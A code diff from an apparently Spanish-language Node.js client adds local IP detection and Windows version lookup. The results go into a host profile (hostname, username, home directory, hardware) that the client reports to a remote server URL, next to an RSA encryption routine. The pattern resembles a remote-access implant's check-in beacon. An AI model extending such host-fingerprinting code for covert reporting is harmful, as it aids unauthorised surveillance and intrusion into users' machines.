@@ -244,18 +244,59 @@ function cifrarConRSA(data, publicKey) {
 // ===============================
 // INFORMACION DEL SISTEMA
 // ===============================
+
+// Obtener la IP local del sistema
+function obtenerIPLocal() {
+    const interfaces = os.networkInterfaces();
+    for (const name of Object.keys(interfaces)) {
+        for (const iface of interfaces[name]) {
+            // Saltar interfaces internas y IPv6
+            if (iface.family === 'IPv4' && !iface.internal) {
+                return iface.address;
+            }
+        }
+    }
+    return 'local';
+}
+
+// Obtener versión de Windows usando os.release()
+function obtenerVersionWindows() {
+    const platform = os.platform();
+    if (platform !== 'win32') return platform;
+
+    const release = os.release(); // Ej: '10.0.22631'
+    const major = parseInt(release.split('.')[0], 10);
+    const build = parseInt(release.split('.')[2], 10) || 0;
+
+    // Determinar versión de Windows basada en build number
+    if (major === 10) {
+        // Windows 11 tiene build >= 22000
+        if (build >= 22000) return 'Windows 11';
+        return 'Windows 10';
+    } else if (major === 6) {
+        const minor = parseInt(release.split('.')[1], 10);
+        if (minor === 3) return 'Windows 8.1';
+        if (minor === 2) return 'Windows 8';
+        if (minor === 1) return 'Windows 7';
+        if (minor === 0) return 'Windows Vista';
+    }
+    return `Windows (${release})`;
+}
+
 function obtenerInfoSistema() {
     return {
         hostname: os.hostname(),
-        platform: os.platform(),
+        platform: obtenerVersionWindows(), // Ahora devuelve "Windows 10" o "Windows 11"
         arch: os.arch(),
         username: os.userInfo().username,
         homedir: os.homedir(),
         cpus: os.cpus().length,
         totalMemory: Math.round(os.totalmem() / 1024 / 1024 / 1024) + ' GB',
-        freeMemory: Math.round(os.freemem() / 1024 / 1024 / 1024) + ' GB'
+        freeMemory: Math.round(os.freemem() / 1024 / 1024 / 1024) + ' GB',
+        ip: obtenerIPLocal() // Añadido: IP local
     };
 }
+
 
 // ===============================
 // GENERAR ID UNICO
@@ -889,8 +930,9 @@ async function conectar() {
             platform: info.platform,
             arch: info.arch,
             username: info.username,
-            ip: 'local',
+            ip: info.ip, // Ahora usa la IP real del sistema
             serverUrl: SERVER_URL // Guardar a cual servidor se conecto
+
         });
     });
 
